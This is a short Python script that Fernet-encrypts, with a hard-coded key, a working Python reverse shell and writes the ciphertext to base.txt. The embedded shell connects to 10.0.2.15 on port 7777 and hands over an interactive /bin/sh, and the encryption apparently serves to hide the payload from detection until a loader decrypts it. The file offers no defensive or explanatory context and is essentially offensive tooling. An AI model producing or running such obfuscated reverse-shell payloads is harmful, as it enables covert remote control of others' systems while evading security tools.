from cryptography.fernet import Fernet

key = "tZpY1mJmS3T8pYb4NQ0T3E5u8p0kKtpBzuV2gEJgHXw="
fernet = Fernet(key)

message = '''import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.2.15", 7777))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])'''

token = fernet.encrypt(message.encode())

with open("base.txt", "wb") as f:
    f.write(token)
